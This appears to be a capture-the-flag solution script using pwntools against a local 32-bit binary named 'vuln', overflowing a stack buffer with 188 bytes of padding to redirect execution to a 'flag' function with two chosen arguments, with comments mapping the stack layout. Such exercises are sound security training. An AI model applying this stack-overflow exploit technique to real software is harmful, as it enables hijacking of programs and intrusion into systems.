from pwn import *

elf=ELF("vuln")
p=process(elf.path)
p.recvuntil(b': ')
##0-180, stack
##180-184, EBX is callee saved (possition independent code)
##184-188, EBP
##188+, EIP
payload=b'A'*188
payload+=p32(elf.sym.flag) 
payload+=p32(elf.sym.main) # return addr for function
payload+=p32(0xdeadbeef)
payload+=p32(0xc0ded00d)
p.sendline(payload)
p.interactive()
